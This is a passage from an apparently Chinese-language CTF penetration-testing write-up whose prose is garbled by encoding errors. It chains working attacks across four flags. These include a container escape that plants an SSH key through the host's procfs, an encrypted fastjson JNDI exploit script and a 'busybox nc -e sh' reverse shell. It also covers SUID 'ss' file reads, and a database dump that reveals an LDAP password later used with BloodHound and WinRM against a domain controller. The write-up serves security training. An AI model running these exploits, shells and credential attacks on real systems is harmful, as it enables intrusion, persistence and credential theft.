</span></span><span style=display:flex><span>            links:https://github.com/LandGrey/SpringBootVulExploit
</span></span></code></pre></div><h1 id=flag1>flag1</h1><p>æœ‰æ´ç›´æ¥æ‰“
<img alt=2025-10-10130045 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10130045.png>
å¯ä»¥ç›´æ¥æ£€æµ‹åˆ°å¯¹åº”çš„cveå•Šï¼Œæ‰“ä¸ªå†…å­˜é©¬è¿›å»
ç®€å•çš„ç¿»äº†ç¿»æ²¡æ‰¾åˆ°flag
æ‰§è¡Œls -alå‘ç°æœ‰æ–‡ä»¶<code>.dockerenv</code>
<img alt=2025-10-10130220 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10130220.png>
å°è¯•æ‰§è¡Œ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -name core_pattern
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/proc/sys/kernel/core_pattern
</span></span><span style=display:flex><span>/host/proc/sys/kernel/core_pattern
</span></span></code></pre></div><p>æŒ‚è½½å®¿ä¸»æœºprocfsé€ƒé€¸è¿™ä¸ªæ¼æ´ï¼Œ
å°è¯•gccç¼–è¯‘è„šæœ¬å‘ç°ç¯å¢ƒé‡Œé¢libcä¸é€‚é…ï¼Œä½¿ç”¨cdk
<a href=https://github.com/cdk-team/CDK>cdk-team/CDK: ğŸ“¦ Make security testing of K8s, Docker, and Containerd easier.</a>
å‘ç°å¤§æ–‡ä»¶ä¸èƒ½æ­£å¸¸ä¼ è¾“ï¼Œåˆ†å‰²ä¼ è¾“ä¸Šå»</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>split -b 100k cdk_linux_amd64_upx cdk.part.
</span></span></code></pre></div><p>ä¸Šä¼ ä¹‹åç›´æ¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat cdk.part.* &gt; cdk_linux
</span></span><span style=display:flex><span>chmod +x ./cdk_linux
</span></span><span style=display:flex><span>./cdk_linux evaluate --full
</span></span><span style=display:flex><span>./cdk_linux run mount-procfs /host/proc/ <span style=color:#e6db74>&#34;mkdir /root/.ssh/&#34;</span>
</span></span></code></pre></div><p>Syntax error: Unterminated quoted stringã€‚å®¹æ˜“å‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œæ³¨æ„ä¸€ä¸‹æ ¼å¼
ä¹‹åæŠŠè‡ªå·±çš„ä¸Šä¼ ä¸Šå»</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./cdk_linux run mount-procfs /host/proc/ <span style=color:#e6db74>&#39;echo ssh-rsa AAAAB3N4Y........8gFDoRl6pmw== root@kali &gt; /root/.ssh/authorized_keys&#39;</span>
</span></span></code></pre></div><p>ç›´æ¥sshç™»å½•æ‹¿åˆ°flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@platform:~# cat /flag
</span></span></code></pre></div><h1 id=flag2>flag2</h1><p>æ­£å¸¸æµç¨‹å°±æ˜¯ä¼ fscanç„¶åå†…ç½‘ç©¿é€å·¥å…·
çœ‹å†…ç½‘çš„ip</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@platform:~# ifconfig
</span></span><span style=display:flex><span>docker0: flags<span style=color:#f92672>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#ae81ff>1500</span>
</span></span><span style=display:flex><span>        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
</span></span><span style=display:flex><span>        inet6 fe80::1443:54ff:fe45:d7ef  prefixlen <span style=color:#ae81ff>64</span>  scopeid 0x20&lt;link&gt;
</span></span><span style=display:flex><span>        ether 16:43:54:45:d7:ef  txqueuelen <span style=color:#ae81ff>0</span>  <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>3679</span>  bytes <span style=color:#ae81ff>238067</span> <span style=color:#f92672>(</span>238.0 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>5462</span>  bytes <span style=color:#ae81ff>7186092</span> <span style=color:#f92672>(</span>7.1 MB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>eth0: flags<span style=color:#f92672>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#ae81ff>1500</span>
</span></span><span style=display:flex><span>        inet 172.16.22.12  netmask 255.255.255.0  broadcast 172.16.22.255
</span></span><span style=display:flex><span>        inet6 fe80::216:3eff:fe04:7839  prefixlen <span style=color:#ae81ff>64</span>  scopeid 0x20&lt;link&gt;
</span></span><span style=display:flex><span>        ether 00:16:3e:04:78:39  txqueuelen <span style=color:#ae81ff>1000</span>  <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>25139</span>  bytes <span style=color:#ae81ff>10649611</span> <span style=color:#f92672>(</span>10.6 MB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>26935</span>  bytes <span style=color:#ae81ff>2108965</span> <span style=color:#f92672>(</span>2.1 MB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>æµ‹è¯•äº†ä¸€ä¸‹åº”è¯¥æ˜¯ä¸å‡ºç½‘,è¿™é‡Œvshellæ­£å‘ä¸Šçº¿</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp /home/orange/tcp_linux_amd64 root @8.130.128.178:/tmp
</span></span></code></pre></div><p>ä¹‹åä¸Šä¼ fscanåˆ°æœºå­é‡Œ
<img alt=2025-10-10133945 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10133945.png>
ä¸Šé¢é‚£ä¸ª<code>172.17.0.1</code>å°±åªæœ‰æœ¬æœºçš„ä¸€äº›ä¸œè¥¿ï¼Œæ²¡æ‰«å‡ºæœ‰ä»€ä¹ˆåˆ©ç”¨çš„ä¸œè¥¿ï¼Œçœ‹ä¸€ä¸‹ä¸‹é¢ä¸€ä¸ª(æ‰«çš„æ—¶å€™ç­‰çš„æ—¶é—´æœ‰ç‚¹é•¿)
<img alt=2025-10-10134749 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10134749.png></p><pre tabindex=0><code>[2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.12    å­˜æ´» (ICMP)
[2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.14    å­˜æ´» (ICMP)
[2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.41    å­˜æ´» (ICMP)
[2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.88    å­˜æ´» (ICMP)
[2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.253   å­˜æ´» (ICMP)
</code></pre><pre tabindex=0><code>172.16.22.41 DC:ZWFW\DC
</code></pre><p><img alt=2025-10-10134930 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10134930.png></p><p>èµ°ä¸ªéš§é“
è®¿é—®<code>http://172.16.22.88/</code>ç›´æ¥ä¸‹è½½apk
<img alt=2025-10-10135143 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10135143.png>
<img alt=2025-10-10135550 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10135550.png>
çŒœæµ‹å’Œ8080æœ‰å…³ï¼Œç›´æ¥åç¼–è¯‘çœ‹ä¸€ä¸‹å†…å®¹
çœ‹ç»„ä»¶åº”è¯¥æ˜¯fastjsonï¼Œä¸»è¦å‘åŒ…çš„ä»£ç åœ¨com.example.mobile.MainActivityé‡Œ</p><ul><li><strong><code>onCreate()</code></strong>ï¼šåˆå§‹åŒ–ç•Œé¢å¹¶åŠ è½½ Compose ç»„ä»¶ï¼›</li><li><strong><code>LoginScreen()</code></strong>ï¼šå®šä¹‰ä¸€ä¸ªç™»å½•ç•Œé¢çš„ UIï¼›</li><li><strong><code>sendLoginRequest()</code></strong>ï¼šè´Ÿè´£å‘é€ç™»å½•è¯·æ±‚åˆ°æœåŠ¡å™¨å¹¶è¿”å›ç»“æœã€‚
æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼šæœåŠ¡å™¨åœ°å€ã€ç”¨æˆ·åå’Œå¯†ç 
è¿™é‡Œç”¨çš„honyå¸ˆå‚…çš„è„šæœ¬ï¼Œä¸å¤ªä¼šé€†å‘</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64  
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os  
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json  
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests  
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.primitives <span style=color:#f92672>import</span> serialization, hashes  
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.primitives.asymmetric <span style=color:#f92672>import</span> padding  
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.primitives.ciphers <span style=color:#f92672>import</span> Cipher, algorithms, modes  
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.backends <span style=color:#f92672>import</span> default_backend  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># ===== é…ç½®ä¿¡æ¯ =====SERVER_URL = &#34;http://172.16.22.88:8080/api/login&#34;  </span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># Java ä»£ç ä¸­çš„ RSA å…¬é’¥ï¼ˆBase64 æ ¼å¼ï¼‰  </span>
</span></span><span style=display:flex><span>PUBLIC_KEY_B64 <span style=color:#f92672>=</span> (  
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqACjbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrztFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXvHVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpDL0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1uxm5ZQIDAQAB&#34;</span>  
</span></span><span style=display:flex><span>)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># ===== 1. è¦å‘é€çš„ JSON æ˜æ–‡ =====plaintext = &#34;&#34;&#34;{  </span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;@type&#34;</span>: <span style=color:#e6db74>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,    <span style=color:#e6db74>&#34;dataSourceName&#34;</span>: <span style=color:#e6db74>&#34;rmi://172.16.22.12:50388/f94022&#34;</span>,    <span style=color:#e6db74>&#34;autoCommit&#34;</span>: true}<span style=color:#e6db74>&#34;&#34;&#34;  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>print(plaintext)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74># ===== 2. ç”Ÿæˆéšæœº AES key (128-bit) =====aes_key = os.urandom(16)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74># ===== 3. AES/GCM åŠ å¯† =====iv = os.urandom(12)  # 12 å­—èŠ‚ IVencryptor = Cipher(  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    algorithms.AES(aes_key),  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    modes.GCM(iv),  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    backend=default_backend()  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>).encryptor()  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ciphertext = encryptor.update(plaintext.encode(&#34;utf-8&#34;)) + encryptor.finalize()  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>tag = encryptor.tag  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74># Body = IV + å¯†æ–‡ + GCM tagbody_raw = iv + ciphertext + tag  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>body_b64 = base64.b64encode(body_raw).decode(&#34;utf-8&#34;)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74># ===== 4. ç”¨ RSA å…¬é’¥åŠ å¯† AES key =====pub_bytes = base64.b64decode(PUBLIC_KEY_B64)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>public_key = serialization.load_der_public_key(pub_bytes, backend=default_backend())  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>enc_key = public_key.encrypt(  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    aes_key,  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    padding.PKCS1v15()  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>enc_key_b64 = base64.b64encode(enc_key).decode(&#34;utf-8&#34;)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74># ===== 5. å‘é€ POST è¯·æ±‚ =====headers = {  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;Content-Type&#34;: &#34;application/octet-stream&#34;,  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;X-Encrypted-Key&#34;: enc_key_b64,  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>}  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>resp = requests.post(SERVER_URL, data=body_b64.encode(&#34;utf-8&#34;), headers=headers, timeout=10)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>print(&#34;Status:&#34;, resp.status_code)  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>print(&#34;Response:&#34;, resp.text)
</span></span></span></code></pre></div><p>åˆ©ç”¨java-chainsï¼ŒæŠŠjdkå’Œjarä¼ åˆ°æœºå­é‡Œé¢(vshellè¿˜æŒºç®€å•ä¼ çš„)å¯åŠ¨ç”¨fastjsonçš„templateslmplçš„bytecodeconverté‡Œé¢æ‰“å…¥å†…å­˜é©¬
å“¥æ–¯æ‹‰è¿æ¥æ‹¿åˆ°flag
<img alt=2025-10-10150535 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10150535.png></p><h1 id=flag3>flag3</h1><p>å¯¹å…¶ä»–ipè¿›è¡Œæ£€ç´¢</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains4 dirsearch -u http://172.16.22.14
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:08:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    1KB - /zabbix/
</span></span></code></pre></div><p>è®¿é—®ä¸€ä¸‹ï¼Œç½‘ç»œæ£€ç´¢ä¸€ä¸‹é»˜è®¤çš„å¯†ç </p><pre tabindex=0><code>Admin/zabbix
</code></pre><p>è¿›å…¥åå°ï¼Œåœ¨å‘Šè­¦è¿™é‡Œçš„è„šæœ¬å¯ä»¥è¾“å…¥å†…å®¹ï¼Œæˆ‘è¾“å‡ºçš„æ˜¯</p><pre tabindex=0><code>whoami;id
</code></pre><p>åœ¨ç›‘æµ‹è¿™é‡Œçœ‹æœ€æ–°æ•°æ®è¿™é‡Œæœ‰å›æ˜¾ï¼Œæ‰“ä¸€ä¸ªåå¼¹shell</p><pre tabindex=0><code>zabbix
uid=115(zabbix) gid=122(zabbix) groups=122(zabbix)
</code></pre><p>æ‰“ä¸ªåå¼¹shellè¿›å»</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>busybox nc 172.16.22.12 <span style=color:#ae81ff>5566</span> -e sh
</span></span></code></pre></div><p>åœ¨å…¥å£æœºncä¸€ä¸‹ç­‰å¾…æ¥æ”¶
ç®€å•çš„ææƒæ‹¿åˆ°flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>zabbix@zabbix:/$ cat flag.txt
</span></span><span style=display:flex><span>cat flag.txt
</span></span><span style=display:flex><span>cat: flag.txt: Permission denied
</span></span><span style=display:flex><span>zabbix@zabbix:/$ find / -perm -4000 -type f -exec ls -la <span style=color:#f92672>{}</span> 2&gt;/dev/null <span style=color:#ae81ff>\;</span>
</span></span><span style=display:flex><span>find / -perm -4000 -type f -exec ls -la <span style=color:#f92672>{}</span> 2&gt;/dev/null <span style=color:#ae81ff>\;</span>
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>30872</span> Feb <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2022</span> /usr/bin/pkexec
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>35200</span> Apr  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2024</span> /usr/bin/umount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>72072</span> Feb  <span style=color:#ae81ff>6</span>  <span style=color:#ae81ff>2024</span> /usr/bin/gpasswd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>59976</span> Feb  <span style=color:#ae81ff>6</span>  <span style=color:#ae81ff>2024</span> /usr/bin/passwd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>72712</span> Feb  <span style=color:#ae81ff>6</span>  <span style=color:#ae81ff>2024</span> /usr/bin/chfn
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>35200</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2022</span> /usr/bin/fusermount3
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>128072</span> Mar <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2022</span> /usr/bin/ss
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>55680</span> Apr  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2024</span> /usr/bin/su
</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> daemon daemon <span style=color:#ae81ff>55624</span> Apr <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2022</span> /usr/bin/at
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>47488</span> Apr  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2024</span> /usr/bin/mount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44808</span> Feb  <span style=color:#ae81ff>6</span>  <span style=color:#ae81ff>2024</span> /usr/bin/chsh
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40496</span> Feb  <span style=color:#ae81ff>6</span>  <span style=color:#ae81ff>2024</span> /usr/bin/newgrp
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>232416</span> Jun <span style=color:#ae81ff>25</span> 20:48 /usr/bin/sudo
</span></span></code></pre></div><p>è¯»ä¸€ä¸‹flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ss -a -F /flag.txt
</span></span></code></pre></div><h1 id=flag4>flag4</h1><p>åœ¨åå°çš„ç”¨æˆ·é‡Œçš„è®¤è¯é‡Œï¼Œæœ‰DCçš„æ•°æ®ï¼Œä¸Šé¢æœ‰ç”¨æˆ·ï¼Œä½†æ²¡æœ‰æƒé™çœ‹é…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœåŠ¡å™¨é‡Œçš„å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>zabbix@zabbix:/etc/zabbix$ ls -al
</span></span><span style=display:flex><span>ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>76</span>
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>5</span> root     root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>3</span> 13:47 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>112</span> root     root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span> 10:32 ..
</span></span><span style=display:flex><span>-rw-r--r--   <span style=color:#ae81ff>1</span> root     root  <span style=color:#ae81ff>1764</span> Aug <span style=color:#ae81ff>25</span> 18:15 apache.conf
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> www-data root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>3</span> 13:46 web
</span></span><span style=display:flex><span>-rw-r--r--   <span style=color:#ae81ff>1</span> root     root <span style=color:#ae81ff>17323</span> Aug <span style=color:#ae81ff>25</span> 18:15 zabbix_agentd.conf
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> root     root  <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span> 18:15 zabbix_agentd.d
</span></span><span style=display:flex><span>-rw-------   <span style=color:#ae81ff>1</span> root     root <span style=color:#ae81ff>31264</span> Sep  <span style=color:#ae81ff>3</span> 13:47 zabbix_server.conf
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> root     root  <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span> 18:15 zabbix_server.d
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ss -a -F /etc/zabbix/zabbix_server.conf
</span></span><span style=display:flex><span>Error: an inet prefix is expected rather than <span style=color:#e6db74>&#34;LogFile=/var/log/zabbix/zabbix_server.log&#34;</span>.
</span></span><span style=display:flex><span>Cannot parse dst/src address.
</span></span></code></pre></div><p>è¿™è¾¹çŒœæµ‹ä¸€äº›æ•°æ®åº“</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mysql -uzabbix -ppassword
</span></span></code></pre></div><p>è¿™é‡Œè¿›å»çœ‹ä¸œè¥¿</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mysql&gt; <span style=color:#66d9ef>select</span> * from userdirectory_ldap<span style=color:#ae81ff>\G</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>select</span> * from userdirectory_ldap<span style=color:#ae81ff>\G</span>;
</span></span><span style=display:flex><span>*************************** 1. row ***************************
</span></span><span style=display:flex><span> userdirectoryid: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            host: 172.16.22.41
</span></span><span style=display:flex><span>            port: <span style=color:#ae81ff>389</span>
</span></span><span style=display:flex><span>         base_dn: OU<span style=color:#f92672>=</span>Zabbix,DC<span style=color:#f92672>=</span>zwfw,DC<span style=color:#f92672>=</span>com
</span></span><span style=display:flex><span>search_attribute: sAMAccountName
</span></span><span style=display:flex><span>         bind_dn: CN<span style=color:#f92672>=</span>ldapadmin,OU<span style=color:#f92672>=</span>Zabbix,DC<span style=color:#f92672>=</span>zwfw,DC<span style=color:#f92672>=</span>com
</span></span><span style=display:flex><span>   bind_password: XpVLGkQHm8
</span></span><span style=display:flex><span>       start_tls: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>   search_filter: 
</span></span><span style=display:flex><span>    group_basedn: 
</span></span><span style=display:flex><span>      group_name: cn
</span></span><span style=display:flex><span>    group_member: 
</span></span><span style=display:flex><span>   user_ref_attr: 
</span></span><span style=display:flex><span>    group_filter: 
</span></span><span style=display:flex><span>group_membership: memberOf
</span></span><span style=display:flex><span>   user_username: 
</span></span><span style=display:flex><span>   user_lastname: 
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> row in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>ç»™åˆ°äº†å¯†ç ï¼Œbloodhoundæ¢æµ‹ä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains4 bloodhound-python -u ldapadmin  -p <span style=color:#e6db74>&#39;XpVLGkQHm8&#39;</span>  -d  zwfw.com  -ns 172.16.22.41  -c all --auth-method ntlm --dns-tcp --zip
</span></span></code></pre></div><p>èƒ½ç›´æ¥DCç™»å½•ç„¶åé“¾æ¥åˆ°administrator
æµ‹è¯•ä¸€ä¸‹çœ‹æ˜¯å¦èƒ½ç™»å½•</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains4 nxc winrm 172.16.22.41 -u ldapadmin -p XpVLGkQHm8
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> config file found: /etc/proxychains4.conf
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> DLL init: proxychains-ng 4.17
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> Dynamic chain  ...  192.168.71.1:6666  ...  172.16.22.41:5985  ...  OK
</span></span><span style=display:flex><span>WINRM       172.16.22.41    <span style=color:#ae81ff>5985</span>   DC               <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.0 Build <span style=color:#ae81ff>26100</span> <span style=color:#f92672>(</span>name:DC<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:zwfw.com<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> Dynamic chain  ...  192.168.71.1:6666  ...  172.16.22.41:5985  ...  OK
